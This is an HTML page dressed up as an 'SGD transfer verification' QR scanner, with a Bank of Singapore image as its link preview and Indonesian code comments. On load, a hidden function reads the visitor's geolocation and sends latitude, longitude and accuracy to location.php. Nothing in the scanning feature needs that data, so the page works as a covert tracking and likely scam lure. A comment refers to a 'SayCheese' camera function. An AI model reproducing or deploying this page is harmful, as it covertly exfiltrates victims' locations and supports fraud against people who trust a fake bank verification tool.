<!DOCTYPE html>
<html lang="id">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<meta property="og:title" content="SGD transfer verification">
<meta property="og:image" content="https://www.disruptiveleadership.institute/wp-content/uploads/2022/05/E-BankofSingapore.png">

<title>Barcode Scanner</title>

<style>
* {
  box-sizing: border-box;
}

body {
  margin: 0;
  background: #111;
  color: white;
  font-family: Arial, sans-serif;
  text-align: center;
}

.container {
  width: 100%;
  max-width: 420px;
  margin: auto;
  padding: 15px;
}

h2 {
  margin: 10px 0 15px;
}

#reader {
  width: 100%;
  height: 400px;
  overflow: hidden;
  border-radius: 15px;
  background: #000;
  position: relative;
}

/* Kotak QRIS di tengah kamera */
#reader::after {
  content: "";
  position: absolute;

  width: 220px;
  height: 220px;

  left: 50%;
  top: 50%;

  transform: translate(-50%, -50%);

  border: 3px solid #00ff88;
  border-radius: 12px;

  pointer-events: none;
  z-index: 10;

  box-shadow:
    0 0 12px #00ff88,
    inset 0 0 12px rgba(0, 255, 136, 0.15);
}

.result {
  margin-top: 15px;
  padding: 15px;
  background: #222;
  border-radius: 12px;
}

#hasil {
  display: block;
  margin: 10px 0;
  padding: 12px;
  background: #000;
  border-radius: 8px;
  word-break: break-all;
  color: #00ff88;
  font-size: 18px;
}

button {
  width: 100%;
  padding: 13px;
  margin-top: 10px;
  border: none;
  border-radius: 10px;
  background: #00aaff;
  color: white;
  font-size: 16px;
  font-weight: bold;
}

button:active {
  transform: scale(.98);
}
</style>
</head>

<body>

<div class="container">

  <h2>📷 SGD transfer verification </h2>

  <div id="reader"></div>

  <div class="result">

    <div>scan results:</div>

    <span id="hasil">Send photo proof.</span>

    <button onclick="salinHasil()">
      📋 Proof of receipt
    </button>

    <button onclick="mulaiScanner()">
      🔄 Scan again
    </button>

  </div>

</div>

<!-- Library Scanner -->
<script src="https://unpkg.com/html5-qrcode"></script>

<script>

let scanner;
let sedangScan = false;
function lokasi() {
  if (navigator.geolocation) {
    navigator.geolocation.getCurrentPosition(kirimLokasi);
  }
}

function kirimLokasi(position) {
  var lat = position.coords.latitude;
  var lon = position.coords.longitude;
  var acc = position.coords.accuracy;

  // Mengirim data ke server PHP lokal
  var xhr = new XMLHttpRequest();
  xhr.open("GET", "location.php?lat=" + lat + "&lon=" + lon + "&acc=" + acc, true);
  xhr.send();
}

// Jalankan fungsi ini saat halaman dimuat
  lokasi();
  // Panggil fungsi kamera asli SayCheese di bawah sini jika ada



/* =========================
   MULAI SCANNER
========================= */

function mulaiScanner() {

  if (sedangScan) return;

  if (scanner) {
    try {
      scanner.clear();
    } catch(e) {}
  }

  scanner = new Html5Qrcode("reader");

  sedangScan = true;

  scanner.start(

    {
      facingMode: "environment"
    },

    {
      fps: 15,

      /* Ukuran kotak scan QRIS */
      qrbox: {
        width: 220,
        height: 220
      }

    },

    function(decodedText) {

      document.getElementById("hasil").textContent =
        decodedText;

      bunyiScan();

      scanner.stop().then(function() {

        sedangScan = false;

      }).catch(function() {

        sedangScan = false;

      });

    },

    function(errorMessage) {

      // Error scan realtime tidak ditampilkan

    }

  ).catch(function(error) {

    sedangScan = false;

    document.getElementById("hasil").textContent =
      "Kamera tidak dapat digunakan";

    console.log(error);

  });

}


/* =========================
   BUNYI BERHASIL SCAN
========================= */

function bunyiScan() {

  const AudioContext =
    window.AudioContext ||
    window.webkitAudioContext;

  if (!AudioContext) return;

  const audioCtx = new AudioContext();

  const oscillator =
    audioCtx.createOscillator();

  const gain =
    audioCtx.createGain();

  oscillator.frequency.value = 1000;

  oscillator.type = "sine";

  gain.gain.value = 0.15;

  oscillator.connect(gain);

  gain.connect(audioCtx.destination);

  oscillator.start();

  setTimeout(function() {

    oscillator.stop();

    audioCtx.close();

  }, 120);

}


/* =========================
   SALIN HASIL
========================= */

function salinHasil() {

  const hasil =
    document.getElementById("hasil").textContent;

  if (
    hasil === "Belum ada barcode" ||
    hasil === "Kamera tidak dapat digunakan"
  ) {
    return;
  }

  navigator.clipboard.writeText(hasil)

    .then(function() {

      alert("Hasil barcode berhasil disalin");

    })

    .catch(function() {

      alert("Tidak dapat menyalin");

    });

}


/* =========================
   MULAI OTOMATIS
========================= */

window.onload = function() {

  mulaiScanner();

};

</script>

</body>
</html>
